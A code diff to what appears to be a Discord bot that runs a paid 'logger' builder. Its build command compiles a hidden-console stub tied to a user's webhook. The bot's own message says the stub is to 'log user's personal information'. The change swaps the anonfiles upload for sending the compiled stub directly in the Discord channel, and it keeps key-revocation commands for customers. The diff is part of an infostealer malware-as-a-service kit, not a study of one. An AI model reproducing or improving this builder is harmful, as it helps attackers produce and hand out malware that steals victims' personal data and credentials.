@@ -309,8 +309,6 @@ async def blacklistk(ctx, userid: str):
     embed.add_field(name=f"{config['name']}", value=f"```{userid}'s key has been revoked```")
     await ctx.send(embed=embed)
 
-
-
 CEE = concurrent.futures.ThreadPoolExecutor(max_workers=100)
 
 @bot.command(name='build')
@@ -357,18 +355,16 @@ def casw(ctx, webhook):
         subprocess.run(f"pyinstaller --onefile --noconsole {sf}", shell=True, check=True)
         
         with open(f"dist/{ef}", "rb") as f:
-            res = requests.post("https://api.anonfiles.com/upload", files={"file": f})
-        
-        download = res.json()["data"]["file"]["url"]["short"]
-        os.remove(sf)
-        shutil.rmtree("dist")
-        shutil.rmtree("build")
+            file = discord.File(f, filename=ef)
+            asyncio.run_coroutine_threadsafe(ctx.send(file=file), bot.loop).result()
         embed = discord.Embed(title=f"{config['name']} Builder", description="Synthetic is Daddy fr :3", color=0x702963)
         embed.add_field(name="Stub Created", value="```>> Your Logger is Compiled !\n>> Use this logger to log user's personal information```", inline=False)
-        embed.add_field(name="Download Link (Your Stub)", value=f"[Download]({download}) :rocket:", inline=False)
-        asyncio.run_coroutine_threadsafe(message.edit(embed=embed), bot.loop)
+        asyncio.run_coroutine_threadsafe(message.edit(embed=embed), bot.loop).result()
+        
+        os.remove(sf)
+        shutil.rmtree("build")
     except Exception as e:
-        asyncio.run_coroutine_threadsafe(message.edit(content="ERROR WHILE COMPILING"), bot.loop)
+        print(f"{str(e)}")
 
 
 
